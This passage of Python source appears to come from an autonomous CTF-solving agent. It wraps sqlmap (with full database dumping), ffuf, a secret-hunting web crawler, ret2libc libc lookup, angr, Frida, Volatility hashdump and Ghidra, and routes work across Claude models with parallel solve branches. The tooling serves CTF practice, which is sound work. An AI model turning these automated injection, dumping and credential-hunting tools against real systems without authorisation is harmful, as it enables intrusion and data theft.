def _kgkey(ctf_name: str) -> str:
    return re.sub(r'[^a-z0-9]', '', ctf_name.lower())

def tool_knowledge_store(ctf_name: str, key: str, value: str) -> str:
    """Store a discovered fact in the cross-challenge CTF knowledge graph."""
    k = _kgkey(ctf_name)
    _ctf_knowledge[k][key] = value
    emit("knowledge", ctf=ctf_name, key=key, value=value[:200])
    log("sys", f"[KG] Stored: {key} = {value[:80]}", "dim")
    return f"Stored: {key} → {value[:80]}"

def tool_knowledge_get(ctf_name: str) -> str:
    """Retrieve all known facts about a CTF (shared infrastructure, creds, patterns)."""
    k = _kgkey(ctf_name)
    facts = _ctf_knowledge.get(k, {})
    if not facts:
        return "No cross-challenge knowledge stored yet for this CTF."
    lines = [f"## Cross-challenge knowledge for '{ctf_name}':"]
    for key, val in facts.items():
        lines.append(f"  {key}: {val}")
    return "\n".join(lines)

def _get_knowledge_injection(ctf_name: str) -> str:
    """Build knowledge context string for system prompt injection."""
    k = _kgkey(ctf_name)
    facts = _ctf_knowledge.get(k, {})
    if not facts: return ""
    lines = ["## Known CTF context (from previous challenges):"]
    for key, val in facts.items():
        lines.append(f"  - {key}: {val}")
    return "\n".join(lines)

# ─── Browser agent (Playwright) ───────────────────────────────────────────────
def tool_browser_agent(url: str, script: str, timeout: int = 60,
                        capture_requests: bool = False, capture_screenshot: bool = False) -> str:
    """
    Playwright headless browser for JS-heavy web challenges.
    Handles SPAs, AJAX, login flows, CSRF tokens, cookie-based auth, DOM manipulation.
    'script' is Python code that runs after page.goto(url) with 'page' and 'browser' available.
    Set capture_requests=True to intercept all XHR/fetch calls.
    """
    intercept_code = ""
    if capture_requests:
        intercept_code = """
captured = []
page.on("request", lambda req: captured.append(f"REQ {req.method} {req.url}"))
page.on("response", lambda res: captured.append(f"RES {res.status} {res.url}"))
"""
    screenshot_code = ""
    if capture_screenshot:
        screenshot_code = """
page.screenshot(path="/tmp/browser_screenshot.png")
print("[SCREENSHOT] /tmp/browser_screenshot.png")
"""
    code = f"""
try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        browser = pw.chromium.launch(
            headless=True,
            args=['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage']
        )
        context = browser.new_context(
            user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            ignore_https_errors=True
        )
        page = context.new_page()
        {intercept_code}
        page.goto({repr(url)}, timeout={timeout*1000}, wait_until='networkidle')
        {script}
        {screenshot_code}
        {'print("Captured requests:", captured)' if capture_requests else ''}
        browser.close()
except ImportError:
    print("Playwright not installed. Run: pip install playwright && playwright install chromium")
except Exception as e:
    import traceback
    print(f"Browser error: {{e}}")
    traceback.print_exc()
"""
    return tool_execute_python(code, timeout=timeout+15)

# ─── Ghidra headless decompiler ───────────────────────────────────────────────
def tool_ghidra_decompile(binary_path: str, function_name: str = "main",
                           all_functions: bool = False, project_dir: str = "/tmp/ghidra_proj") -> str:
    """
    Ghidra headless decompilation. Returns semantically rich C pseudocode.
    Set all_functions=True to decompile every function (for small binaries).
    Falls back to radare2/objdump if Ghidra not installed.
    """
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    os.makedirs(project_dir, exist_ok=True)

    # Try Ghidra headless
    ghidra_paths = [
        shutil.which("analyzeHeadless"),
        "/opt/ghidra/support/analyzeHeadless",
        "/usr/local/ghidra/support/analyzeHeadless",
        os.path.expanduser("~/ghidra/support/analyzeHeadless"),
    ]
    ghidra = next((p for p in ghidra_paths if p and os.path.exists(p)), None)

    if ghidra:
        # Write inline decompile script
        script_content = f"""
import ghidra.app.decompiler.*;
import ghidra.program.model.listing.*;
DecompInterface di = new DecompInterface();
di.openProgram(currentProgram);
FunctionManager fm = currentProgram.getFunctionManager();
{"for (Function f : fm.getFunctions(true)) {" if all_functions else f'Function f = fm.getFunctions(true).iterator().next();  // fallback'}
    DecompileResults dr = di.decompileFunction(f, 60, monitor);
    if (dr.decompileCompleted()) {{
        println("\\n=== " + f.getName() + " ===");
        println(dr.getDecompiledFunction().getC());
    }}
{"}" if all_functions else ""}
"""
        script_path = "/tmp/ghidra_decompile.java"
        with open(script_path, "w") as sf: sf.write(script_content)
        proj_name = f"ctf_{int(time.time())}"
        cmd = (f"'{ghidra}' '{project_dir}' '{proj_name}' -import '{sp}' "
               f"-postScript '{script_path}' -deleteProject 2>&1")
        out = _shell(cmd, timeout=120)
        if "=== " in out or "void " in out or "int " in out:
            return out[:8000]
        return f"Ghidra ran but no output matched. Raw:\n{out[:2000]}"
    else:
        # Fallback chain: r2 → objdump → strings
        log("warn", "Ghidra not found — falling back to radare2", "")
        r2 = _shell(f"r2 -q -c 'aaa;s sym.{function_name};pdf' '{sp}' 2>/dev/null", timeout=45)
        if r2 and "invalid" not in r2.lower() and len(r2) > 50:
            return f"[r2 fallback]\n{r2[:6000]}"
        return _shell(f"objdump -d -M intel '{sp}' | head -300", timeout=30)

# ─── AI function namer ────────────────────────────────────────────────────────
def tool_ai_rename_functions(decompiled_output: str, api_key: str = "",
                              binary_path: str = "") -> str:
    """
    Use Claude to semantically rename sub_XXXX functions in decompiled code.
    Returns annotated version with meaningful names and inline comments explaining purpose.
    This dramatically reduces the cognitive load of hard rev challenges.
    """
    if not api_key:
        # Try to read from environment
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        return "ai_rename_functions requires ANTHROPIC_API_KEY in environment."

    try:
        import anthropic as _ant
        c = _ant.Anthropic(api_key=api_key)
        prompt = f"""You are a reverse engineering expert. Below is decompiled C pseudocode with generic names like sub_401234, var_8, etc.

Rewrite it with:
1. Meaningful function names based on what the code does
2. Meaningful variable names  
3. Short inline comments on non-obvious logic
4. Identify: input validation, crypto operations, flag checks, network code, encoding/decoding

Output ONLY the renamed code, no preamble.

DECOMPILED CODE:
{decompiled_output[:6000]}"""

        resp = c.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=4096,
            messages=[{"role": "user", "content": prompt}]
        )
        renamed = resp.content[0].text if resp.content else ""
        log("ok", "[AI-RENAME] Functions renamed semantically", "white")
        return renamed
    except Exception as e:
        return f"AI rename error: {e}"

# ─── Libc database lookup ─────────────────────────────────────────────────────
def tool_libc_lookup(leak_address: str, symbol: str = "puts",
                      extra_symbols: dict = None) -> str:
    """
    Look up libc version from a leaked function address via libc.rip.
    Returns matching libc versions with download links and key gadget offsets.
    Use after leaking a GOT/PLT address to get the exact libc for ret2libc.
    """
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        # Normalize address
        addr = leak_address.strip()
        if addr.startswith("0x") or addr.startswith("0X"):
            addr_int = int(addr, 16)
        else:
            addr_int = int(addr)

        params = {symbol: hex(addr_int)}
        if extra_symbols:
            params.update({k: hex(int(v,16) if isinstance(v,str) and v.startswith("0x") else int(v))
                          for k,v in extra_symbols.items()})

        r = requests.post("https://libc.rip/api/find", json=params, timeout=10)
        data = r.json()

        if not data:
            return f"No libc found for {symbol}={hex(addr_int)}. Try a different leaked symbol."

        lines = [f"Found {len(data)} matching libc(s) for {symbol}={hex(addr_int)}:"]
        for lib in data[:5]:
            lines.append(f"\n  [{lib.get('id','')}] {lib.get('buildid','')} ({lib.get('version','?')})")
            lines.append(f"    Download: https://libc.rip/{lib.get('download_url','')}")
            # Key offsets
            syms = lib.get('symbols', {})
            for s in ['system', '__libc_system', 'execve', '/bin/sh', 'one_gadget',
                      'puts', 'printf', 'read', 'write', '__free_hook', '__malloc_hook']:
                if s in syms:
                    lines.append(f"    {s}: {hex(int(syms[s],16))}")

        lines.append(f"\nUsage in pwntools:")
        lines.append(f"  from pwn import *")
        lines.append(f"  libc = ELF('./libc.so.6')")
        lines.append(f"  libc.address = {symbol}_leak - libc.sym['{symbol}']")
        lines.append(f"  system = libc.sym['system']")
        lines.append(f"  binsh  = next(libc.search(b'/bin/sh'))")
        return "\n".join(lines)
    except ImportError:
        return "pip install requests"
    except Exception as e:
        return f"Libc lookup error: {e}"

# ─── FactorDB RSA lookup ──────────────────────────────────────────────────────
def tool_factordb(n: str) -> str:
    """
    Look up RSA modulus factorization on factordb.com.
    If already factored by the community, returns p and q instantly.
    Essential first step for any RSA challenge before attempting other attacks.
    """
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        n_int = int(str(n).strip())
        r = requests.get(f"https://factordb.com/api", params={"query": str(n_int)}, timeout=15)
        data = r.json()
        status = data.get("status", "")
        factors = data.get("factors", [])

        status_map = {
            "FF":  "Fully factored",
            "CF":  "Composite, factors known",
            "C":   "Composite, factors unknown",
            "P":   "Prime",
            "PRP": "Probable prime",
            "U":   "Unknown",
        }
        label = status_map.get(status, status)
        lines = [f"FactorDB result for n ({len(str(n_int))} digits): {label}"]

        if factors:
            lines.append(f"Factors:")
            factor_vals = []
            for f_pair in factors:
                fval = int(f_pair[0])
                fexp = int(f_pair[1])
                factor_vals.extend([fval]*fexp)
                lines.append(f"  {fval}^{fexp}")

            if len(factor_vals) == 2:
                p, q = sorted(factor_vals)
                lines.append(f"\np = {p}")
                lines.append(f"q = {q}")
                lines.append(f"\n# Decrypt RSA:")
                lines.append(f"from Crypto.Util.number import inverse")
                lines.append(f"phi = (p-1)*(q-1)")
                lines.append(f"d = inverse(e, phi)")
                lines.append(f"m = pow(c, d, n)")
        else:
            lines.append("Not factored. Try: rho attack, yafu, msieve, CADO-NFS for large composites.")
            lines.append(f"Bit length: {n_int.bit_length()}")
            if n_int.bit_length() <= 512:
                lines.append("→ Feasible with CADO-NFS or msieve on modern hardware")
            elif n_int.bit_length() <= 768:
                lines.append("→ Very hard. Check for weak key patterns first.")
        return "\n".join(lines)
    except ImportError:
        return "pip install requests"
    except Exception as e:
        return f"FactorDB error: {e}"

# ─── angr symbolic execution ──────────────────────────────────────────────────
def tool_angr_solve(binary_path: str, find_addr: str = "", avoid_addrs: list = None,
                    stdin_len: int = 64, custom_code: str = "", timeout: int = 120) -> str:
    """
    angr symbolic execution for automatic input synthesis.
    find_addr: hex address of success state (e.g. "0x401234")
    avoid_addrs: list of hex addresses to avoid (wrong branch, exit)
    stdin_len: length of stdin to symbolize
    custom_code: extra angr Python code (for complex setups)
    """
    sp = repr(binary_path)
    find_str  = f"find={find_addr}," if find_addr else ""
    avoid_str = f"avoid={[int(a,16) for a in (avoid_addrs or [])]}," if avoid_addrs else ""
    code = f"""
try:
    import angr, claripy
    proj = angr.Project({sp}, auto_load_libs=False)
    # Find good/bad addresses automatically if not specified
    main_addr = proj.loader.find_symbol('main')
    entry = proj.entry if not main_addr else main_addr.rebased_addr

    # Symbolize stdin
    flag = claripy.BVS('flag', {stdin_len}*8)
    state = proj.factory.entry_state(stdin=flag)

    # Constrain to printable ASCII
    for byte in flag.chop(8):
        state.add_constraints(byte >= 0x20, byte <= 0x7e)

    sm = proj.factory.simulation_manager(state)
    print(f"Starting angr exploration from {{hex(entry)}}")

    {"sm.explore(" + find_str + avoid_str + "timeout=" + str(timeout-10) + ")" if (find_addr or avoid_addrs) else "sm.explore(timeout=" + str(timeout-10) + ")"}

    if sm.found:
        sol = sm.found[0]
        flag_val = sol.solver.eval(flag, cast_to=bytes)
        print(f"Solution found: {{flag_val}}")
        # Also try to get stdout
        try:
            out = sol.posix.dumps(1)
            print(f"Program output: {{out}}")
        except: pass
    else:
        print(f"No solution found. States: {{sm}}")
        print("Try: specify find_addr/avoid_addrs, increase timeout, or use custom_code")

    {custom_code}

except ImportError:
    print("angr not installed. Run: pip install angr")
except Exception as e:
    import traceback
    print(f"angr error: {{e}}")
    traceback.print_exc()
"""
    return tool_execute_python(code, timeout=timeout)

# ─── SQLMap integration ───────────────────────────────────────────────────────
def tool_sqlmap(target_url: str, param: str = "", data: str = "",
                cookie: str = "", level: int = 3, risk: int = 2,
                technique: str = "BEUSTQ", dbms: str = "", extra_args: str = "") -> str:
    """
    SQLMap for automatic SQL injection exploitation.
    Level 1-5 (thoroughness), Risk 1-3 (aggressiveness).
    Returns discovered databases, tables, data dump.
    """
    cmd_parts = ["sqlmap", "-u", f"'{target_url}'", "--batch", "--random-agent",
                 f"--level={level}", f"--risk={risk}", f"--technique={technique}",
                 "--timeout=10", "--retries=2"]
    if param:    cmd_parts += [f"-p '{param}'"]
    if data:     cmd_parts += [f"--data='{data}'"]
    if cookie:   cmd_parts += [f"--cookie='{cookie}'"]
    if dbms:     cmd_parts += [f"--dbms={dbms}"]
    if extra_args: cmd_parts.append(extra_args)
    # Try to dump everything useful
    cmd_parts += ["--dbs", "--tables", "--dump-all", "--smart", "--stop-at-first",
                  f"--output-dir=/tmp/sqlmap_{int(time.time())}"]

    cmd = " ".join(cmd_parts) + " 2>&1"
    out = _shell(cmd, timeout=120)
    if "command not found" in out or "not found" in out.lower():
        return ("sqlmap not installed. Install: pip install sqlmap\n"
                "Or via system: sudo apt install sqlmap\n"
                "Alternatively use web_attack(sql_injection_test) for basic detection.")
    return out[:6000]

# ─── FFUF web fuzzer ──────────────────────────────────────────────────────────
def tool_ffuf(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
              extensions: str = "", method: str = "GET", headers: dict = None,
              filter_codes: str = "404,400", match_codes: str = "",
              data: str = "", fuzz_param: str = "FUZZ", timeout: int = 60) -> str:
    """
    FFUF for directory/parameter/vhost fuzzing.
    Replace the fuzz target with FUZZ in the URL, headers, or data.
    """
    if "FUZZ" not in url and "FUZZ" not in str(data) and "FUZZ" not in str(headers):
        url = url.rstrip("/") + "/FUZZ"

    cmd_parts = ["ffuf", "-w", f"{wordlist}:{fuzz_param}", "-u", f"'{url}'",
                 "-t", "50", "-timeout", "5", "-c"]
    if method != "GET":  cmd_parts += ["-X", method]
    if data:             cmd_parts += ["-d", f"'{data}'"]
    if filter_codes:     cmd_parts += ["-fc", filter_codes]
    if match_codes:      cmd_parts += ["-mc", match_codes]
    if extensions:       cmd_parts += ["-e", extensions]
    if headers:
        for k,v in headers.items(): cmd_parts += ["-H", f"'{k}: {v}'"]

    cmd = " ".join(cmd_parts) + f" -o /tmp/ffuf_{int(time.time())}.json -of json 2>&1 | tail -50"
    out = _shell(cmd, timeout=timeout)
    if "command not found" in out or "not found" in out.lower():
        # Fallback to gobuster
        gb_cmd = f"gobuster dir -u '{url.replace('/FUZZ','')}' -w {wordlist} -t 40 2>&1 | head -60"
        gb_out = _shell(gb_cmd, timeout=timeout)
        if "command not found" in gb_out or "not found" in gb_out.lower():
            return ("Neither ffuf nor gobuster found.\n"
                    "Install: sudo apt install ffuf gobuster\nOr: go install github.com/ffuf/ffuf/v2@latest")
        return f"[gobuster fallback]\n{gb_out}"
    return out

# ─── OOB web crawler / spider ─────────────────────────────────────────────────
def tool_web_crawl(base_url: str, max_depth: int = 3, max_pages: int = 100,
                   headers: dict = None, cookies: dict = None,
                   find_patterns: list = None) -> str:
    """
    Lightweight Burp-style spider. Maps all routes, forms, params, JS endpoints.
    find_patterns: list of regex patterns to flag (e.g. ["flag","secret","admin","key"])
    """
    code = f"""
import requests, re
from urllib.parse import urljoin, urlparse
from collections import deque
requests.packages.urllib3.disable_warnings()

base_url = {repr(base_url)}
headers  = {json.dumps(headers or {})}
cookies  = {json.dumps(cookies or {})}
find_pats= {json.dumps(find_patterns or ["flag","secret","admin","key","password","token","api"])}
max_pages= {max_pages}
max_depth= {max_depth}

visited  = set()
queue    = deque([(base_url, 0)])
endpoints= set()
forms    = []
findings = []
base_dom = urlparse(base_url).netloc

s = requests.Session()
s.headers.update(headers or {{}})
s.verify = False

while queue and len(visited) < max_pages:
    url, depth = queue.popleft()
    if url in visited or depth > max_depth: continue
    visited.add(url)
    try:
        r = s.get(url, cookies=cookies, timeout=8, allow_redirects=True)
        body = r.text
        # Extract links
        for href in re.findall(r'href=["\\'](.*?)["\\'\\s>]', body):
            full = urljoin(url, href.strip())
            if urlparse(full).netloc == base_dom and full not in visited:
                queue.append((full, depth+1))
                endpoints.add(full)
        # Extract API endpoints from JS
        for ep in re.findall(r'["\\'](/(?:api|v[0-9]|admin|user|auth|login|flag)[^\\"\\' ]*)["\\'\\s,)]', body):
            endpoints.add(urljoin(url, ep))
        # Extract forms
        for form in re.findall(r'<form[^>]*>(.*?)</form>', body, re.DOTALL):
            action = re.search(r'action=["\\'](.*?)["\\'\\s>]', form)
            method = re.search(r'method=["\\'](.*?)["\\'\\s>]', form)
            inputs = re.findall(r'<input[^>]*name=["\\'](.*?)["\\'\\s>]', form)
            if action:
                forms.append({{"action": urljoin(url, action.group(1)),
                              "method": method.group(1).upper() if method else "GET",
                              "inputs": inputs, "found_on": url}})
        # Check for interesting patterns
        for pat in find_pats:
            hits = re.findall(rf'.{{0,50}}{pat}.{{0,50}}', body, re.IGNORECASE)
            if hits:
                for hit in hits[:3]:
                    findings.append(f"[{pat.upper()}] {{url}}: {{hit.strip()}}")
    except Exception as e:
        pass

print(f"Crawled {{len(visited)}} pages, found {{len(endpoints)}} endpoints, {{len(forms)}} forms")
print(f"\\n=== Endpoints ===")
for ep in sorted(endpoints)[:60]: print(f"  {{ep}}")
print(f"\\n=== Forms ===")
for f in forms[:20]: print(f"  {{f['method']}} {{f['action']}} params={{f['inputs']}}")
if findings:
    print(f"\\n=== Interesting findings ===")
    for f in findings[:30]: print(f"  {{f}}")
"""
    return tool_execute_python(code, timeout=90)

# ─── Volatility 3 memory forensics ────────────────────────────────────────────
def tool_volatility(image_path: str, plugin: str, args: str = "", timeout: int = 120) -> str:
    """
    Volatility 3 memory forensics.
    Common plugins: windows.pslist, windows.pstree, windows.cmdline, windows.filescan,
    windows.dumpfiles, windows.registry.hivelist, windows.hashdump,
    linux.pslist, linux.bash, linux.proc.Maps, linux.malfind,
    mac.pslist, mac.bash
    """
    sp = _w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path
    # Try vol3 first, then vol2
    for cmd in [f"vol -f '{sp}' {plugin} {args} 2>&1",
                f"vol3 -f '{sp}' {plugin} {args} 2>&1",
                f"python3 /opt/volatility3/vol.py -f '{sp}' {plugin} {args} 2>&1"]:
        out = _shell(cmd, timeout=timeout)
        if "not found" not in out.lower() and "Error" not in out[:50]:
            return out[:6000]

    # Auto-suggest plugins if unknown
    return (f"Volatility not found or plugin error. Install: pip install volatility3\n"
            f"Common first steps:\n"
            f"  vol -f image.mem windows.info  # Identify OS\n"
            f"  vol -f image.mem windows.pslist # Process list\n"
            f"  vol -f image.mem windows.cmdline # Command lines\n"
            f"  vol -f image.mem windows.filescan | grep -i flag # Find flag files\n"
            f"  vol -f image.mem windows.dumpfiles --virtaddr <addr> # Dump file\n"
            f"Raw output:\n{out[:1000]}")

# ─── Frida dynamic instrumentation ────────────────────────────────────────────
def tool_frida_trace(binary_path: str, script: str = "", function_hooks: list = None,
                     pid: int = 0, timeout: int = 30) -> str:
    """
    Frida dynamic instrumentation for reverse engineering.
    Hooks functions, intercepts calls, dumps args/retvals, bypasses anti-debug.
    script: Frida JS code
    function_hooks: list of function names to auto-hook and log
    """
    if not script and function_hooks:
        hooks = "\n".join([f"""
Interceptor.attach(Module.findExportByName(null, '{fn}'), {{
    onEnter: function(args) {{
        console.log('[{fn}] args:', args[0], args[1], args[2]);
    }},
    onLeave: function(retval) {{
        console.log('[{fn}] ret:', retval);
    }}
}});""" for fn in function_hooks])
        script = hooks

    if not script:
        script = """
// Default: hook all interesting crypto/comparison functions
['strcmp','strncmp','memcmp','bcmp','MD5','SHA256','AES_encrypt'].forEach(fn => {
    try {
        var sym = Module.findExportByName(null, fn);
        if (sym) Interceptor.attach(sym, {
            onEnter: args => console.log('[' + fn + ']', args[0].readUtf8String?.() || args[0])
        });
    } catch(e) {}
});
"""
    script_file = f"/tmp/frida_script_{int(time.time())}.js"
    with open(script_file, "w") as f: f.write(script)

    if pid:
        cmd = f"frida -p {pid} -l '{script_file}' --no-pause -q 2>&1 & sleep {timeout}; kill %1 2>/dev/null"
    elif binary_path:
        sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
        cmd = f"frida '{sp}' -l '{script_file}' --no-pause -q 2>&1 & sleep {timeout}; kill %1 2>/dev/null"
    else:
        return "Provide binary_path or pid"

    out = _shell(cmd, timeout=timeout+5)
    if "command not found" in out or "not found" in out.lower():
        return ("Frida not installed. Install: pip install frida frida-tools\n"
                "Then: frida-ps -a to list running processes")
    return out[:4000]

# ─── Hypothesis ranker ────────────────────────────────────────────────────────
def tool_rank_hypotheses(challenge_description: str, category: str,
                          recon_results: str, api_key: str = "") -> str:
    """
    Use Claude Haiku to rapidly score attack hypotheses by evidence strength.
    Returns ranked list of attack vectors with confidence scores and reasoning.
    This prevents wasting iterations on low-probability approaches.
    """
    if not api_key:
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        return "rank_hypotheses requires ANTHROPIC_API_KEY."

    try:
        import anthropic as _ant
        c = _ant.Anthropic(api_key=api_key)
        resp = c.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=1024,
            messages=[{"role": "user", "content": f"""CTF challenge analysis. Category: {category}

DESCRIPTION:
{challenge_description[:2000]}

RECON RESULTS:
{recon_results[:3000]}

List the top 5 attack vectors in order of likelihood. For each, give:
1. Attack name (specific technique)
2. Confidence 1-10
3. Key evidence supporting it
4. First tool to try

Format as:
#1 [confidence=X/10] ATTACK NAME
Evidence: ...
First step: tool_name(specific_args)

Be precise. No padding."""}]
        )
        return resp.content[0].text if resp.content else "No hypotheses generated."
    except Exception as e:
        return f"Hypothesis ranking error: {e}"

# ─── Solver critic ────────────────────────────────────────────────────────────
def tool_critic(conversation_summary: str, iterations_used: int,
                category: str, api_key: str = "") -> str:
    """
    Adversarial critic agent that reads the current approach and diagnoses failures.
    Triggers automatically every N fruitless iterations. Uses claude-sonnet-4-6.
    Returns concrete pivot recommendations.
    """
    if not api_key:
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    if not api_key:
        return "critic requires ANTHROPIC_API_KEY."

    try:
        import anthropic as _ant
        c = _ant.Anthropic(api_key=api_key)
        resp = c.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1024,
            messages=[{"role": "user", "content": f"""You are a ruthless CTF expert reviewing a failed solve attempt.

CATEGORY: {category}
ITERATIONS USED: {iterations_used}

CONVERSATION SUMMARY (what has been tried):
{conversation_summary[:4000]}

Diagnose what is wrong with this approach. Be harsh and specific.
Then give 3 concrete next actions that are DIFFERENT from what was tried.

Format:
DIAGNOSIS: [one paragraph on what's wrong]
PIVOT 1: [specific tool + exact arguments]
PIVOT 2: [specific tool + exact arguments]
PIVOT 3: [specific tool + exact arguments]
KEY INSIGHT: [the one thing the solver is missing]"""}]
        )
        result_text = resp.content[0].text if resp.content else "Critic failed."
        log("warn", f"[CRITIC] {result_text[:200]}", "")
        return result_text
    except Exception as e:
        return f"Critic error: {e}"

# ─── Pre-solve parallel recon ─────────────────────────────────────────────────
def tool_pre_solve_recon(binary_path: str = "", url: str = "",
                          category: str = "Unknown") -> str:
    """
    Run parallel pre-solve reconnaissance appropriate for the challenge category.
    For pwn: checksec + file + strings + one_gadget
    For web: headers + robots.txt + source map check + JS endpoint scan
    For rev: file + strings + entropy + export/import table
    For forensics: file + exiftool + binwalk + entropy blocks
    Returns combined report to inform hypothesis generation.
    """
    results = {}
    tasks = []

    if binary_path and os.path.exists(binary_path):
        sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
        if category in ("Binary Exploitation", "Reverse Engineering", "Unknown"):
            tasks = [
                ("file_type",  lambda: _shell(f"file '{sp}' && wc -c '{sp}'")),
                ("checksec",   lambda: _shell(f"checksec --file='{sp}' 2>/dev/null || python3 -c \"from pwn import ELF; print(ELF('{sp}').checksec())\" 2>/dev/null")),
                ("strings",    lambda: _shell(f"strings -n 8 '{sp}' | head -200")),
                ("functions",  lambda: _shell(f"nm '{sp}' 2>/dev/null | head -60; objdump -t '{sp}' 2>/dev/null | grep -i 'F' | head -30")),
                ("entropy",    lambda: tool_analyze_file(binary_path, "entropy")),
            ]
            if category == "Binary Exploitation":
                tasks.append(("one_gadget", lambda: _shell(f"one_gadget '{sp}' 2>/dev/null | head -30 || echo 'one_gadget not installed'")))
                tasks.append(("rop_gadgets", lambda: _shell(f"ROPgadget --binary '{sp}' --rop 2>/dev/null | head -40 || echo 'ROPgadget not installed'")))
        elif category == "Forensics":
            tasks = [
                ("file_type",  lambda: _shell(f"file '{sp}' && wc -c '{sp}'")),
                ("metadata",   lambda: _shell(f"exiftool '{sp}' 2>/dev/null | head -40")),
                ("binwalk",    lambda: _shell(f"binwalk '{sp}' 2>/dev/null")),
                ("entropy",    lambda: tool_analyze_file(binary_path, "entropy")),
                ("strings",    lambda: _shell(f"strings -n 6 '{sp}' | grep -iE 'flag|ctf|key|secret|pass' | head -30")),
            ]

    elif url:
        tasks = [
            ("http_headers", lambda: tool_http_request(url, headers={"User-Agent": "Mozilla/5.0"})),
            ("robots",       lambda: tool_http_request(url.rstrip("/")+"/robots.txt")),
            ("source_map",   lambda: tool_js_analyze(url, "fetch_sourcemap") if url.endswith(".js") else "N/A"),
            ("tech_detect",  lambda: _shell(f"whatweb '{url}' 2>/dev/null || curl -sI '{url}' | head -20")),
        ]

    lines = ["## Pre-solve recon results:"]
    with ThreadPoolExecutor(max_workers=min(len(tasks), 6)) as ex:
        futures = {ex.submit(fn): name for name, fn in tasks}
        for fut in as_completed(futures, timeout=60):
            name = futures[fut]
            try:
                out = str(fut.result())[:1500]
                results[name] = out
                lines.append(f"\n### {name}\n{out}")
            except Exception as e:
                lines.append(f"\n### {name}\nError: {e}")

    return "\n".join(lines)

# ─── Multi-model call helper ──────────────────────────────────────────────────
_MODEL_HAIKU  = "claude-haiku-4-5-20251001"
_MODEL_SONNET = "claude-sonnet-4-6"
_MODEL_OPUS   = "claude-opus-4-6"

ITERATION_BUDGET = {
    "easy":   12,
    "medium": 25,
    "hard":   45,
    "insane": 70,
}

def _select_model(category: str, difficulty: str, iteration: int,
                  total_iters: int, user_model: str) -> tuple[str, bool, int]:
    """
    Multi-model routing:
    - Returns (model_id, use_extended_thinking, thinking_tokens)
    - Uses Opus + extended thinking for hard crypto/rev on fresh iterations
    - Falls back to Sonnet for most solving
    - Uses Haiku for triage/critic (called separately, not here)
    """
    hard_categories = {"Cryptography", "Reverse Engineering"}
    use_thinking = False
    thinking_tokens = 0

    # Honor explicit user model choice
    if user_model not in (_MODEL_SONNET, _MODEL_OPUS, _MODEL_HAIKU, ""):
        return user_model, False, 0

    # Opus + extended thinking for hard math/crypto/rev challenges
    if (category in hard_categories and
        difficulty in ("hard", "insane") and
        iteration <= total_iters // 2):
        model = _MODEL_OPUS
        use_thinking = True
        thinking_tokens = 8000 if difficulty == "hard" else 12000
        return model, use_thinking, thinking_tokens

    # Opus for insane challenges in any category (first half)
    if difficulty == "insane" and iteration <= total_iters // 3:
        model = _MODEL_OPUS
        use_thinking = True
        thinking_tokens = 10000
        return model, use_thinking, thinking_tokens

    # Default: Sonnet for everything else
    return _MODEL_SONNET, False, 0

# ─── Parallel branch solver ───────────────────────────────────────────────────
def _run_branch(branch_id: int, hypothesis: str, challenge_ctx: dict,
                api_key: str, active_tools: list, system: str,
                max_iters: int, extra: dict,
                result_queue: list, stop_event: threading.Event) -> None:
    """
    Run a single hypothesis branch. Adds flag to result_queue if found.
    Stops early if stop_event is set (another branch won).
    """
    try:
        import anthropic as _ant
        client = _ant.Anthropic(api_key=api_key)
        ctf_name = challenge_ctx.get("ctf_name", "")
        cat = challenge_ctx.get("category", "")
        name = challenge_ctx.get("name", "")

        branch_system = system + f"\n\n## Branch {branch_id} hypothesis:\n{hypothesis}\nPursue ONLY this approach. If you find strong counter-evidence after 3 tool calls, say HYPOTHESIS_FAILED."

        msgs = [{"role": "user", "content":
                 f"[Branch {branch_id}] {challenge_ctx.get('user_msg','')}"}]

        for i in range(max_iters):
            if stop_event.is_set(): return
            try:
                resp = client.messages.create(
                    model=_MODEL_SONNET, max_tokens=4096,
                    system=branch_system, tools=active_tools, messages=msgs
                )
            except Exception: return

            tool_results = []
            for block in resp.content:
                btype = getattr(block, "type", None)
                if btype == "text":
                    if "HYPOTHESIS_FAILED" in block.text: return
                    flag = extract_flag(block.text, ctf_name)
                    if flag:
                        result_queue.append((branch_id, hypothesis, flag))
                        stop_event.set()
                        return
                elif btype == "tool_use":
                    if block.name in TOOL_MAP:
                        try:
                            tout = TOOL_MAP[block.name](block.input)
                        except Exception as e:
                            tout = str(e)
                    else:
                        tout = f"Unknown tool: {block.name}"
                    flag = extract_flag(str(tout), ctf_name)
                    if flag:
                        result_queue.append((branch_id, hypothesis, flag))
                        stop_event.set()
                        return
                    tool_results.append({"type":"tool_result","tool_use_id":block.id,"content":str(tout)})

            msgs.append({"role":"assistant","content":resp.content})
            stop = getattr(resp,"stop_reason",None)
            if tool_results:
                msgs.append({"role":"user","content":tool_results})
            elif stop == "end_turn":
                return
    except Exception:
        return

def run_parallel_branches(hypotheses: list, challenge_ctx: dict, api_key: str,
                          active_tools: list, system: str, branch_iters: int,
                          extra: dict) -> tuple[str, str] | None:
    """
    Launch 2-3 parallel hypothesis branches. Return (winning_hypothesis, flag) or None.
    """
    if not hypotheses: return None
    branches = hypotheses[:3]  # max 3 concurrent branches
    result_queue = []
    stop_event = threading.Event()

    log("sys", f"[PARALLEL] Launching {len(branches)} hypothesis branches simultaneously", "bright")
    for i, hyp in enumerate(branches):
        log("sys", f"  Branch {i+1}: {hyp[:80]}", "dim")

    threads = []
    for i, hyp in enumerate(branches):
        t = threading.Thread(
            target=_run_branch,
            args=(i+1, hyp, challenge_ctx, api_key, active_tools, system,
                  branch_iters, extra, result_queue, stop_event),
            daemon=True
        )
        threads.append(t)
        t.start()

    # Wait for first result or all threads to finish
